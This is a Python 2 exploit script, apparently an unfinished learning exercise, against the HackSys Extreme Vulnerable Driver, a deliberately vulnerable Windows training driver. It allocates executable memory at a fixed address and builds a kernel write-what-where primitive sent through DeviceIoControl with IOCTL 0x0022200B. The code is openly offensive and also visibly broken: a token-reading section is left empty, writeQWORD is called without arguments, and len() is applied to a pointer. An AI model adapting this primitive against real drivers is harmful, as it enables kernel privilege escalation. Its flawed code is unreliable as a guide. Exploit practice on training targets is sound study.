import ctypes, struct, sys, os, win32con, time, platform
from ctypes import *
from ctypes.wintypes import *
from win32com.shell import shell

#easy definitions to save characters
ntdll = windll.ntdll
kernel32 = windll.kernel32
gdi32 = windll.gdi32
user32 = windll.user32 

#constants - I'm not even sure what these do
ntdll.NtAllocateVirtualMemory.argtypes = [c_ulonglong, POINTER(c_ulonglong), c_ulonglong, POINTER(c_ulonglong), c_ulonglong, c_ulonglong]
STATUS_SUCCESS = 0
written = c_size_t()

# Allocate memory to use for the HEVD Leak
# Easy to recognize arbitrary address
baseadd = c_ulonglong(0x000000001a000000) 
# Some size
addsize = c_ulonglong(0x3000) 
# The win32con may be fucked up, but I saw this in another exploit's source code using this same library I think it's ok.
dwStatus = ntdll.NtAllocateVirtualMemory(0xFFFFFFFFFFFFFFFF, byref(baseadd), 0x0, byref(addsize), (win32con.MEM_COMMIT | win32con.MEM_RESERVE), win32con.PAGE_EXECUTE_READWRITE)
# If not zero (True), something didn't work.
if dwStatus != STATUS_SUCCESS:
	print("Something went wrong while allocating memory","e")
	sys.exit()

def writeQWORD(driver=None, what=None, where=None):
	what_addr = 0x000000001a001000 # Arbitrary offset inside baseadd
  	# Write the what value to what_addr
	data = struct.pack("<Q", what)
	dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF, what_addr, data, len(data), byref(written))
	if dwStatus == 0:
		print("Something went wrong while writing to memory","e")
		sys.exit()
  
  # Pack the address of the what value and the where address
	data = struct.pack("<Q", what_addr) + struct.pack("<Q", where)
	dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF, 0x000000001a000000, data, len(data), byref(written))
	if dwStatus == 0:
		print("Something went wrong while writing to memory in the packing section","e")
		sys.exit()

	#IOCTL
	IoControlCode = 0x0022200B
	#Where
	InputBuffer = c_void_p(0x000000001a000000)
	# I THINK this should work?
	InputBufferLength = len(InputBuffer)
	# If our buffer length is zero can't we set OutputBuffer to None?
	OutputBuffer = c_void_p(0x00000001a002000)
	OutputBufferLength = 0x0
	dwBytesReturned = c_ulong()
	lpBytesReturned = byref(dwBytesReturned)

	triggerIOCTL = kernel32.DeviceIoControl(driver, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, lpBytesReturned, NULL)
	return triggerIOCTL

# This is reserved for reading the offset token address.



# Exploit the driver
def executeOverwrite():
	driver_handle = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000,0, None, 0x3, 0, None)
	if not driver_handle or driver_handle == -1:
		print "[!] Driver handle not found :(\n"
		sys.exit()
	else:
		print "[X] Got handle to the driver.\n"
		writeQWORD()

		
		
